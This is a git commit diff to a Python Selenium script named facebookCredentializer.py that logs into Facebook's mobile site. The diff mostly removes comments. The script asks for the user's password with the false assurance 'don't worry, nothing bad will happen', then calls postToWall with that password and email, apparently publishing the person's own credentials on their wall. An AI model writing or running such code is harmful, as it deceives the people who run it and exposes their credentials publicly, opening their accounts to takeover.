6157b62752c4ccc85020a5839cab3fd0d77fce25
Aaron Basch <baschography@gmail.com>
2020-12-02 20:30:35 -0500

    for real this time

--- facebookCredentializer.py
+++ facebookCredentializer.py
@@ -3,7 +3,6 @@ from webdriver_manager.firefox import GeckoDriverManager
 from webdriver_manager.chrome import ChromeDriverManager
 import time
 
-
 LOGIN_URL = 'https://mbasic.facebook.com/'
 
 class FacebookLogin():
@@ -12,25 +11,23 @@ class FacebookLogin():
         self.email = email
         self.password = password
         if browser == 'Chrome':
-            # Use chrome
             self.driver = webdriver.Chrome(executable_path=ChromeDriverManager().install())
         elif browser == 'Firefox':
-            # Set it to Firefox
             self.driver = webdriver.Firefox(executable_path=GeckoDriverManager().install())
         self.driver.get(LOGIN_URL)
-        time.sleep(1) # Wait for some time to load
+        time.sleep(1)
 
     def login(self):
         email_element = self.driver.find_element_by_name('email')
-        email_element.send_keys(self.email) # Give keyboard input
+        email_element.send_keys(self.email)
 
         password_element = self.driver.find_element_by_name('pass')
-        password_element.send_keys(self.password) # Give password as input too
+        password_element.send_keys(self.password)
 
         login_button = self.driver.find_element_by_name('login')
-        login_button.click() # Send mouse click
-        time.sleep(2) # Wait for 2 seconds for the page to show up
-        # self.driver.get(LOGIN_URL)
+        login_button.click()
+        time.sleep(2)
+
 
     def postToWall(self, p, e):
         self.driver.get(LOGIN_URL)
@@ -42,11 +39,11 @@ class FacebookLogin():
         post_it.click()
         print("Posted...")
 
-
 if __name__ == '__main__':
     # Enter your login credentials here
     username = input('please enter facebook username/email: ')
     pw = input("please enter facebook password (don't worry, nothing bad will happen)")
+    
     fb_login = FacebookLogin(email=username, password=pw, browser='Firefox')
     fb_login.login()
     fb_login.postToWall(pw, username)
